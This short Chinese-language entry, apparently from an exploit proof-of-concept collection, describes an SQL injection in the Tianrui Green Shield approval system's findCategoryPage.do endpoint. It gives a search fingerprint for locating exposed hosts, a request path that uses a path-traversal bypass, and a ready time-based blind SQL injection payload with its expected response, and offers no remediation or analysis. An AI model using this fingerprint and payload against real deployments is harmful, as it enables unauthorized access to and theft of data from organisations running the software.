# 天锐绿盾审批系统findCategoryPage.do存在SQL注入漏洞

天锐绿盾 ｜ SQL注入 ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`POST /trwfe/login.jsp/.%2e/invoker/findCategoryPage.do HTTP/1.1`

**Payload**
```
tenantId=1&sort=id%20OR%20(SELECT+1337+FROM+(SELECT(SLEEP(5)))test)&order=asc
```
- **响应特征**：200